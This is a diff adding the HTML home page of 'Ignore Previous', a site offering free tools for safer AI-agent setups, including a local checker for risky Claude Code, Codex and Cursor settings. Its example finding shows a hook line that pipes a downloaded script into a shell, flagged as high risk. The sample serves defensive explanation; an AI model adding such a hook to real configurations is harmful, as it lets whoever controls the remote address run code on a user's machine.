@@ -1,0 +1,171 @@
+<!doctype html>
+<html lang="en-AU">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Ignore Previous: small tools for working with AI agents</title>
+<meta name="description" content="Free tools for people working with AI agents. The code is public, and each tool says what it cannot do.">
+<meta property="og:title" content="Ignore Previous">
+<meta property="og:description" content="Free tools for people working with AI agents. The code is public.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://ignoreprevious.dev/">
+<meta property="og:image" content="https://ignoreprevious.dev/assets/og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="theme-color" content="#f1f3f7" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#14161c" media="(prefers-color-scheme: dark)">
+<link rel="icon" href="/favicon.svg" type="image/svg+xml">
+<link rel="preload" href="/assets/fonts/bricolage-grotesque-latin.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/fonts/figtree-latin.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="stylesheet" href="/assets/site.css">
+<script src="/assets/js-class.js"></script>
+</head>
+<body>
+<div class="wrap">
+  <div class="mast">
+    <a class="logo" href="/" aria-label="Ignore Previous, home">
+      <svg viewBox="0 0 40 40" aria-hidden="true"><line class="r-line" x1="20" y1="3" x2="20" y2="9"/><circle class="r-acc" cx="20" cy="4" r="3"/><rect class="r-fill" x="5" y="9" width="30" height="26" rx="8"/><circle class="r-ink" cx="14" cy="21" r="3"/><circle class="r-ink" cx="26" cy="21" r="3"/></svg>
+      Ignore Previous
+    </a>
+    <span class="tag">by ruddy-dev</span>
+  </div>
+
+  <main class="wrap inner-wrap">
+  <header class="hero">
+    <div class="bot" aria-hidden="true">
+      <svg class="head" viewBox="0 0 200 220">
+        <line class="r-line" x1="100" y1="14" x2="100" y2="44"/>
+        <circle class="r-acc" cx="100" cy="14" r="11"/>
+        <rect class="r-fill" x="10" y="84" width="16" height="44" rx="6"/>
+        <rect class="r-fill" x="174" y="84" width="16" height="44" rx="6"/>
+        <rect class="r-fill" x="22" y="44" width="156" height="130" rx="34"/>
+        <rect class="r-ink" x="44" y="74" width="112" height="56" rx="20"/>
+        <circle class="r-acc no-stroke" cx="76" cy="102" r="12"/>
+        <circle class="r-acc no-stroke" cx="124" cy="102" r="12"/>
+        <line class="r-line" x1="72" y1="152" x2="128" y2="152"/>
+        <path class="r-fill" d="M52 214 V190 a14 14 0 0 1 14 -14 H134 a14 14 0 0 1 14 14 V214 Z"/>
+      </svg>
+      <svg class="gear" viewBox="0 0 60 60"><circle class="gear-teeth" cx="30" cy="30" r="22"/><circle class="gear-body" cx="30" cy="30" r="18"/><circle cx="30" cy="30" r="6" fill="var(--bg)" stroke="var(--ink)" stroke-width="3"/></svg>
+    </div>
+    <div class="hero-text">
+      <h1>Robots are fine. <mark>Use them carefully.</mark></h1>
+      <p>Ignore Previous makes small, free tools for people who use AI agents (programs that carry out tasks on a computer for you). The code for each one is public, so anyone can read how it is built. Each tool says what it sends, where it runs and what it cannot do.</p>
+      <a class="newbie" href="/what-can-my-ai-see/">
+        <span class="nb-text"><b>New to ChatGPT or Claude?</b><span>A plain guide to what the app can see and remember.</span></span>
+        <span class="nb-btn">Read What Can My AI See?</span>
+      </a>
+    </div>
+  </header>
+
+  <section class="sect" aria-labelledby="tools">
+    <h2 class="h2" id="tools">Tools</h2>
+    <div class="stack">
+
+      <article class="card split wa">
+        <div class="col">
+          <div>
+            <h3>What's Allowed</h3>
+            <span class="handle">whatsallowed</span>
+          </div>
+          <p>A free checker that reads the settings files of Claude Code, Codex and Cursor and flags risky ones. Each finding names the file, the line number and a code for the rule.</p>
+          <p class="fine">For example: a setting that downloads a script from the internet and runs it at once, a helper tool that fetches new code each time it starts, or a file of secrets, such as passwords, that the agent can read without asking.</p>
+          <p class="fine">Runs on your own computer. It does not send usage data back to us. A check of your settings, not a full security assessment.</p>
+          <div class="cmd"><code id="c1">npx whatsallowed</code><button type="button" data-target="c1">Copy</button></div>
+        </div>
+        <div class="show">
+          <div class="tabs">
+            <div class="tablist" role="tablist" aria-label="What's Allowed examples">
+              <button type="button" role="tab" id="tab-finding" aria-selected="true" aria-controls="panel-finding" tabindex="0">The finding</button>
+              <button type="button" role="tab" id="tab-term" aria-selected="false" aria-controls="panel-term" tabindex="-1">In your terminal</button>
+            </div>
+            <div class="panels">
+              <div role="tabpanel" id="panel-finding" aria-labelledby="tab-finding">
+                <div class="plabel">The finding</div>
+                <div class="code" role="group" aria-label="Example: a settings file with one risky line flagged">
+                  <div class="tab"><b>.claude/settings.json</b> (example)</div>
+<pre><span class="ln"><i>1</i><span>{</span></span><span class="ln"><i>2</i><span>  "hooks": {</span></span><span class="ln"><i>3</i><span>    "PostToolUse": [{</span></span><span class="ln"><i>4</i><span>      "matcher": "Edit",</span></span><span class="ln"><i>5</i><span>      "hooks": [{ "type": "command",</span></span><span class="ln hot"><i>6</i><span>        "command": "curl -s https://example.dev/x.sh | sh" }]</span></span></pre>
+                  <div class="callwrap">
+                    <div class="callout">
+                      <div class="meta"><b>HIGH HOOK-001</b><em>.claude/settings.json, line 6</em></div>
+                      <div class="why">This hook downloads a script and runs it straight away. Whoever controls that address decides what runs on your machine.</div>
+                    </div>
+                  </div>
+<pre class="flush"><span class="ln"><i>7</i><span>    }]</span></span><span class="ln"><i>8</i><span>  }</span></span><span class="ln"><i>9</i><span>}</span></span></pre>
+                </div>
+              </div>
+              <div role="tabpanel" id="panel-term" aria-labelledby="tab-term">
+                <div class="plabel">In your terminal</div>
+                <div class="term" role="group" aria-label="Example: running the checker in a terminal">
+                  <div class="tbar">Terminal (example output)</div>
+                  <div class="tbody">
+                    <div class="tcmd"><code id="t1">npx whatsallowed</code><button type="button" data-target="t1">Copy</button></div>
+                    <div class="fnd">
+                      <div class="h"><span class="sev high">HIGH</span><span class="id">HOOK-001</span><span class="loc">.claude/settings.json:6</span></div>
+                      <div class="r"><b>Why</b><span>The hook downloads a script and pipes it into a shell.</span></div>
+                      <div class="r"><b>Fix</b><span>Download and review the script, keep a copy in the repo, and run that copy.</span></div>
+                    </div>
+                    <div class="fnd">
+                      <div class="h"><span class="sev">MEDIUM</span><span class="id">MCP-001</span><span class="loc">.cursor/mcp.json:4</span></div>
+                      <div class="r"><b>Why</b><span>The MCP server (a small program that links an AI tool to other services) runs through npx with no exact version, so each start fetches the newest code.</span></div>
+                      <div class="r"><b>Fix</b><span>Pin an exact version, for example example-docs-mcp@1.2.3.</span></div>
+                    </div>
+                    <div class="tfoot">1 high, 1 medium.</div>
+                    <div class="plug"><span class="dim">In Claude Code, with the plugin:</span><code>check my agent config</code></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="promises">
+            <p class="promise"><span class="pi"><a href="https://github.com/ignore-previous/whatsallowed/blob/main/docs/THREAT_MODEL.md">Only reads files</a> <span class="dot">&middot;</span></span> <span class="pi"><a href="https://github.com/ignore-previous/whatsallowed/blob/main/test/no-network.test.ts">Does not connect to the internet (tested)</a> <span class="dot">&middot;</span></span> <span class="pi"><a href="https://github.com/ignore-previous/whatsallowed/blob/main/docs/ACCURACY.md">Publishes how accurate its checks are</a></span></p>
+          </div>
+        </div>
+      </article>
+
+      <article class="card compact">
+        <div class="col">
+          <div>
+            <h3>Unclank</h3>
+            <span class="handle">unclank</span>
+          </div>
+          <p>Skills (add-ons) for Claude Code and Codex. They check work made with AI help for signs that nobody checked it. Before launch, they look for leftover defaults on a site or app, such as the starter icon and page title. They also look for flaws in quiz questions and problems on game store pages. Each check cites its sources.</p>
+          <p class="fine">Runs inside Claude Code or Codex, so the files it reads go to that app like any other request. It adds no tracking of its own.</p>
+        </div>
+        <div class="cmds">
+          <div class="cmd"><code id="c2">/plugin marketplace add ignore-previous/unclank</code><button type="button" data-target="c2">Copy</button></div>
+          <div class="cmd"><code id="c3">/plugin install unclank@unclank</code><button type="button" data-target="c3">Copy</button></div>
+        </div>
+      </article>
+
+      <article class="card compact">
+        <div class="col">
+          <div>
+            <h3>Clank Safely</h3>
+            <span class="handle">a page, not a program</span>
+          </div>
+          <p>A plain page for setting up Claude Code or Codex so it can't do more than you meant. It starts with a check of what is allowed now, then explains three ways of working with the official setting names, and says which settings the tool enforces and which are only advice. Every claim links to its source or is marked Unverified.</p>
+          <p class="fine">Advice only. It changes nothing on your computer and does not make an agent safe on its own.</p>
+        </div>
+        <div class="cmds">
+          <a class="newbie" href="/clank-safely/">
+            <span class="nb-text"><b>Set up an agent carefully</b><span>Three ways of working, with sources.</span></span>
+            <span class="nb-btn">Read Clank Safely</span>
+          </a>
+        </div>
+      </article>
+
+    </div>
+  </section>
+
+  </main>
+
+  <footer>
+    <div><a href="https://github.com/ignore-previous">github.com/ignore-previous</a><br>The code for this site, What's Allowed and Unclank is public there.</div>
+    <div>Say hello: <span class="addr">hello@ignoreprevious.dev</span><br>New to ChatGPT or Claude? <a href="/what-can-my-ai-see/">Read What Can My AI See?</a></div>
+    <div>We count visits with Cloudflare Web Analytics. No cookies, no personal data, no tracking across sites.<br><span class="nod">Yes, the name is a joke. The tools are not.</span></div>
+    <div class="fonts">Fonts served from this site: Bricolage Grotesque (The Bricolage Grotesque Project Authors), Figtree (The Figtree Project Authors) and JetBrains Mono (The JetBrains Mono Project Authors). <a href="/assets/fonts/OFL.txt">SIL Open Font License 1.1</a>.</div>
+  </footer>
+</div>
+<script src="/assets/site.js"></script>
+<!-- CF_BEACON -->
+</body>
+</html>
